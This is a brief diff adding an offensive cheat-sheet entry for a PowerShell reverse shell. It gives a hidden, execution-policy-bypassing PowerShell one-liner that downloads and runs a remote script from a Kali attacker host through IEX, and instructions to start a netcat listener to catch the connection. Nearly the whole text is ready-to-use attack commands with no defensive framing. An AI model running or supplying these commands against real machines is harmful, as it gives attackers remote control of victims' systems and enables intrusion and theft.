@@ -1,0 +1,17 @@
+## **PowerShell Reverse Shell Command**
+
+```powershell
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://<kali_ip>/reverse.ps1')"
+```
+
+### **Steps:**
+
+1. **Set Up the Listener on Kali**  
+    Run Netcat to listen for incoming connections:
+    
+    ```bash
+    nc -lvnp <port>
+    ```
+    
+    Replace `<port>` with the desired listening port.
+    
